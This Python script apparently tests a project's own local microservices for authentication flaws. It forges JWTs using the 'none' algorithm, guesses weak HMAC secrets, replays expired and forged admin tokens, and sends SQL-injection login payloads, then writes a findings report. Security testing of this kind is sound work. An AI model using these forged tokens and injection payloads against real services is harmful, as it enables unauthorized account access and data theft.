#!/usr/bin/env python3
"""
Authentication Bypass Hack Script
Tests for authentication vulnerabilities in backend services
"""

import os
import requests
import json
import sys
import jwt
import time
from datetime import datetime, timedelta

# Get the directory of this script for portable paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

class AuthenticationBypassHacker:
    def __init__(self, base_urls):
        self.base_urls = base_urls
        self.findings = []
        self.valid_token = None
        
    def create_test_user(self):
        """Create a test user to get a valid token"""
        user_service = self.base_urls.get('user_service', 'http://localhost:8081')
        
        # Try to register a test user
        try:
            response = requests.post(f"{user_service}/register", json={
                "email": f"authtest_{int(time.time())}@example.com",
                "username": f"authtest_{int(time.time())}",
                "password": "TestPassword123!",
                "first_name": "Auth",
                "last_name": "Test",
                "age": 25
            }, timeout=5)
            
            if response.status_code == 201:
                data = response.json()
                return data.get('token')
        except:
            pass
        
        return None
    
    def test_jwt_none_algorithm(self, endpoint):
        """Test JWT 'none' algorithm vulnerability"""
        print(f"[*] Testing JWT 'none' algorithm on {endpoint}")
        
        # Create token with 'none' algorithm
        try:
            header = {"alg": "none", "typ": "JWT"}
            payload = {
                "user_id": 1,
                "exp": int(time.time()) + 3600
            }
            
            # Encode without signature
            token = jwt.encode(payload, "", algorithm="none")
            
            headers = {"Authorization": f"Bearer {token}"}
            response = requests.get(endpoint, headers=headers, timeout=5)
            
            if response.status_code == 200:
                self.findings.append({
                    "type": "JWT 'none' Algorithm Bypass",
                    "endpoint": endpoint,
                    "payload": token[:50] + "...",
                    "response": response.status_code
                })
                print(f"  [!] VULNERABLE to JWT none algorithm bypass!")
                return True
        except Exception as e:
            print(f"  [-] Error: {e}")
            
        return False
    
    def test_weak_jwt_secret(self, endpoint):
        """Test JWT with weak/known secret"""
        print(f"[*] Testing weak JWT secret on {endpoint}")
        
        weak_secrets = [
            "",
            "secret",
            "key",
            "123456",
            "password",
            "jwt_secret",
            "mysecret",
            "topsecret"
        ]
        
        for secret in weak_secrets:
            try:
                # Try to decode with weak secret and re-encode
                token = jwt.encode({"user_id": 1}, secret, algorithm="HS256")
                
                headers = {"Authorization": f"Bearer {token}"}
                response = requests.get(endpoint, headers=headers, timeout=5)
                
                if response.status_code != 401 and response.status_code != 403:
                    self.findings.append({
                        "type": "Weak JWT Secret",
                        "endpoint": endpoint,
                        "secret": secret,
                        "response": response.status_code
                    })
                    print(f"  [!] VULNERABLE with secret '{secret}'!")
                    return True
            except:
                pass
                
        return False
    
    def test_expired_token(self, endpoint):
        """Test using expired JWT token"""
        print(f"[*] Testing expired JWT token on {endpoint}")
        
        try:
            # Create expired token
            payload = {
                "user_id": 1,
                "exp": int(time.time()) - 3600  # Expired 1 hour ago
            }
            expired_token = jwt.encode(payload, "secret_key", algorithm="HS256")
            
            headers = {"Authorization": f"Bearer {expired_token}"}
            response = requests.get(endpoint, headers=headers, timeout=5)
            
            # If expired token works, it's a vulnerability
            if response.status_code == 200:
                self.findings.append({
                    "type": "Expired JWT Token Accepted",
                    "endpoint": endpoint,
                    "response": response.status_code
                })
                print(f"  [!] VULNERABLE - Expired token accepted!")
                return True
            else:
                print(f"  [+] Properly rejected expired token (status: {response.status_code})")
        except Exception as e:
            print(f"  [-] Error: {e}")
            
        return False
    
    def test_token_none_user_id(self, endpoint):
        """Test JWT with user_id = 1 (admin)"""
        print(f"[*] Testing privilege escalation via JWT on {endpoint}")
        
        try:
            # Create token claiming to be user_id 1
            payload = {
                "user_id": 1,  # Try to escalate to admin
                "exp": int(time.time()) + 3600
            }
            token = jwt.encode(payload, "secret_key", algorithm="HS256")
            
            headers = {"Authorization": f"Bearer {token}"}
            response = requests.get(endpoint, headers=headers, timeout=5)
            
            if response.status_code == 200:
                self.findings.append({
                    "type": "JWT Privilege Escalation",
                    "endpoint": endpoint,
                    "payload": "user_id: 1",
                    "response": response.status_code
                })
                print(f"  [!] Could access resource with forged token!")
        except Exception as e:
            print(f"  [-] Error: {e}")
            
        return False
    
    def test_missing_auth_header(self, endpoint):
        """Test accessing protected endpoint without auth"""
        print(f"[*] Testing missing auth header on {endpoint}")
        
        try:
            response = requests.get(endpoint, timeout=5)
            
            if response.status_code == 200:
                self.findings.append({
                    "type": "Missing Authentication",
                    "endpoint": endpoint,
                    "response": response.status_code,
                    "evidence": "Accessible without auth header"
                })
                print(f"  [!] VULNERABLE - Accessible without authentication!")
                return True
            else:
                print(f"  [+] Properly requires authentication (status: {response.status_code})")
        except Exception as e:
            print(f"  [-] Error: {e}")
            
        return False
    
    def test_empty_token(self, endpoint):
        """Test with empty/broken token"""
        print(f"[*] Testing empty token on {endpoint}")
        
        try:
            headers = {"Authorization": "Bearer "}
            response = requests.get(endpoint, headers=headers, timeout=5)
            
            if response.status_code == 200:
                self.findings.append({
                    "type": "Empty Token Accepted",
                    "endpoint": endpoint,
                    "response": response.status_code
                })
                print(f"  [!] VULNERABLE - Empty token accepted!")
                return True
        except Exception as e:
            print(f"  [-] Error: {e}")
            
        return False
    
    def test_sql_injection_login(self, url):
        """Test SQL injection in login to bypass authentication"""
        print(f"[*] Testing SQL injection login bypass on {url}")
        
        payloads = [
            {"email": "admin'--", "password": "anything"},
            {"email": "admin' OR '1'='1", "password": "anything"},
            {"email": "' OR 1=1--", "password": "anything"},
            {"email": "admin'#", "password": "anything"},
            {"email": "admin@localhost'--", "password": "anything"},
        ]
        
        for payload in payloads:
            try:
                response = requests.post(url, json=payload, timeout=5)
                
                # Check if login successful (status 200 with user data)
                if response.status_code == 200:
                    data = response.json()
                    if 'user' in data and 'token' in data:
                        self.findings.append({
                            "type": "SQL Injection Login Bypass",
                            "endpoint": url,
                            "payload": payload,
                            "response": response.status_code,
                            "token": data.get('token', '')[:30] + "..."
                        })
                        print(f"  [!] VULNERABLE! Login bypassed with: {payload}")
                        return True
            except Exception as e:
                pass
                
        return False
    
    def run_attack(self):
        """Execute authentication bypass attacks"""
        print("\n" + "="*60)
        print("AUTHENTICATION BYPASS HACK ATTACK")
        print("="*60)
        
        user_service = self.base_urls.get('user_service', 'http://localhost:8081')
        
        # Get a valid token first
        print("\n[*] Attempting to create test user...")
        self.valid_token = self.create_test_user()
        if self.valid_token:
            print(f"[+] Got valid token: {self.valid_token[:30]}...")
        else:
            print("[-] Could not create test user")
        
        # Test protected endpoints
        profile_endpoint = f"{user_service}/profile"
        
        # Test various auth bypass techniques
        self.test_missing_auth_header(profile_endpoint)
        self.test_empty_token(profile_endpoint)
        self.test_jwt_none_algorithm(profile_endpoint)
        self.test_expired_token(profile_endpoint)
        self.test_token_none_user_id(profile_endpoint)
        
        # Test SQL injection login bypass
        login_endpoint = f"{user_service}/login"
        self.test_sql_injection_login(login_endpoint)
        
        print(f"\n[*] Authentication bypass attack completed. Found {len(self.findings)} vulnerabilities.")
        return self.findings


def main():
    base_urls = {
        'user_service': 'http://localhost:8081',
        'event_service': 'http://localhost:8082',
        'message_service': 'http://localhost:8083'
    }
    
    hacker = AuthenticationBypassHacker(base_urls)
    findings = hacker.run_attack()
    
    # Save report - use relative path
    report_file = os.path.join(SCRIPT_DIR, "hack_report_02_auth_bypass.txt")
    with open(report_file, 'w') as f:
        f.write("AUTHENTICATION BYPASS HACK REPORT\n")
        f.write("="*60 + "\n\n")
        f.write(f"Total vulnerabilities found: {len(findings)}\n\n")
        
        for i, finding in enumerate(findings, 1):
            f.write(f"Finding #{i}\n")
            for key, value in finding.items():
                f.write(f"{key}: {value}\n")
            f.write("-"*60 + "\n\n")
    
    print(f"\n[+] Report saved to: {report_file}")
    
    return 0 if len(findings) == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
